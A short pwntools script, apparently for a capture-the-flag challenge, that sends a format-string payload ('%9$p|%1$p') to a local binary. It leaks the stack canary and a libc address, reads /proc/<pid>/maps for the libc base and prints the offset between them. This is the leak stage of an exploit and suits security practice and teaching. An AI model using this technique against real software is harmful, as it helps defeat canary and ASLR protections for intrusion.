from pwn import *
import re

context.binary = elf = ELF("./chal", checksec=False)
context.log_level = "error"

def libc_base_from_maps(pid: int) -> int:
    with open(f"/proc/{pid}/maps", "r") as f:
        for line in f:
            if "libc.so.6" in line:
                # format: base-end perms offset dev inode path
                base = int(line.split("-")[0], 16)
                return base
    raise RuntimeError("Could not find libc base in /proc/pid/maps")

io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])
pid = io.pid

io.recvuntil(b"What is your favourite pokemon?\n")
io.sendline(b"%9$p|%1$p")
io.recvuntil(b"I see you like...\n")
leaks = io.recvline().strip().split(b"|")

canary = int(leaks[0], 16)
leak = int(leaks[1], 16)

base = libc_base_from_maps(pid)
delta = leak - base

print(f"CANARY = {hex(canary)}")
print(f"LEAK   = {hex(leak)}")
print(f"LIBC_BASE (local) = {hex(base)}")
print(f"DELTA (leak - base) = {hex(delta)}")

io.close()
